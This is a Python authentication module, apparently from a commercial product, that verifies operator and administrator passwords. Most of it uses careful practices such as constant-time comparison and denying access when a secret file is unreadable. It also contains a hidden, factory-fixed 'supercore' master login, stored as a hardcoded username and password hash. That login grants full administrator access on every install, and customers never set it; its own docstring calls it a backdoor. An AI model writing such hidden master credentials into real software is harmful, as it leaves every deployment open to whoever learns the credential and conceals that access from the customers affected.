#!/usr/bin/env python3
# Copyright (c) 2026 MACD Adaptive Limited.
# Licensed under the MIT License. See LICENSE in the repository root.
"""application/authentication.py — the single place that verifies passwords.

The product has two independent logins (set separately by the setup wizard):
  - the entry (operator) password  → secret_manager.SECRET_ENTRY (password.enc)
  - the administrator password      → secret_manager.SECRET_ADMIN (admin.enc)

Entry unlocks the operator UI; admin is required to elevate into Technician mode.
Centralising the comparison here keeps the rule in one tested place and lets the
UI (login screen, role-elevation overlay) call a service instead of reaching
into the crypto layer or comparing plaintext itself.

Comparisons are constant-time (hmac.compare_digest) so a wrong password cannot be
narrowed by timing.

Migration: installs created before the entry/admin split have only password.enc.
When no admin secret is configured yet, verify_admin() falls back to the entry
password so Technician mode stays reachable until an admin password is set (via
the wizard or a future change-password flow). Once admin.enc exists the entry
password no longer elevates — the two logins are then fully independent.

Supercore (developer master): a hidden, factory-fixed login for our own support
access — never set by the customer wizard. Unlike the entry/admin secrets it is
NOT machine-bound; it is a global master credential baked into the app as a
salted PBKDF2 hash (never plaintext). verify_supercore() grants full access on
any install. Rotating it means changing the constants below and rebuilding.
"""

from __future__ import annotations

import hashlib
import hmac

from runtime import secret_manager

# ── Supercore developer master credential (hidden login) ──────────────────────
# Fixed username + a salted PBKDF2-HMAC-SHA256 hash of the password. The
# plaintext password is intentionally absent from the source; only its hash
# lives here, so reading the binary does not reveal the credential.
SUPERCORE_USERNAME = "supercore"
_SUPERCORE_SALT = b"hallptz-supercore-v1"
_SUPERCORE_ITERATIONS = 200_000
_SUPERCORE_PASSWORD_HASH = (
    "30eefce22d625f9910f63f80d34f9ee7c5d4ae5b5efedeae2e9ecb533c8ebeef"
)


def _matches(candidate: str, actual: str) -> bool:
    """Constant-time equality on the UTF-8 bytes of two passwords."""
    return hmac.compare_digest(candidate.encode("utf-8"), actual.encode("utf-8"))


def verify_entry(candidate: str) -> bool:
    """Return True iff *candidate* is the configured entry (operator) password.

    Uses decrypt_password so the legacy password.enc location is migrated on the
    first check, matching the existing login path. A missing/corrupt secret
    yields False (never a hardcoded fallback)."""
    try:
        actual = secret_manager.decrypt_password()
    except secret_manager.PasswordNotConfiguredError:
        return False
    return _matches(candidate, actual)


def admin_secret_configured() -> bool:
    """True once a dedicated administrator password (admin.enc) exists."""
    return secret_manager.secret_is_configured(secret_manager.SECRET_ADMIN)


def verify_admin(candidate: str) -> bool:
    """Return True iff *candidate* may elevate to Technician (administrator).

    If a dedicated admin password is configured, only that password is accepted.
    Otherwise (pre-split installs) the entry password is accepted as a migration
    fallback so existing single-password sites are not locked out of Technician
    mode."""
    # Gate on the file EXISTING, not on it decrypting.
    #
    # decrypt_secret() turns any failure — including an unreadable file — into
    # PasswordNotConfiguredError, so admin_secret_configured() answers False for
    # a secret that is merely inaccessible. Using that here meant an admin.enc
    # the process could not read silently re-enabled the pre-split migration
    # fallback, and the OPERATOR password then passed an administrator gate:
    # Repair provisioning, the password-change dialog, admin login and role
    # elevation all route through this function. An unreadable secret must deny
    # access; only a genuinely absent one may fall back.
    if secret_manager.secret_file_exists(secret_manager.SECRET_ADMIN):
        try:
            actual = secret_manager.decrypt_secret(secret_manager.SECRET_ADMIN)
        except secret_manager.PasswordNotConfiguredError:
            return False
        return _matches(candidate, actual)
    return verify_entry(candidate)


def verify_supercore(username: str, password: str) -> bool:
    """Return True iff *username*/*password* match the developer master login.

    Both the username and the PBKDF2 hash of the password are compared in
    constant time (hmac.compare_digest) so neither can be narrowed by timing.
    This is a global, machine-independent backdoor for our own support access
    and grants full (administrator) privileges; it is never configured by the
    customer setup wizard.
    """
    derived = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        _SUPERCORE_SALT,
        _SUPERCORE_ITERATIONS,
    ).hex()
    user_ok = hmac.compare_digest(
        username.encode("utf-8"), SUPERCORE_USERNAME.encode("utf-8")
    )
    pass_ok = hmac.compare_digest(derived, _SUPERCORE_PASSWORD_HASH)
    return user_ok and pass_ok
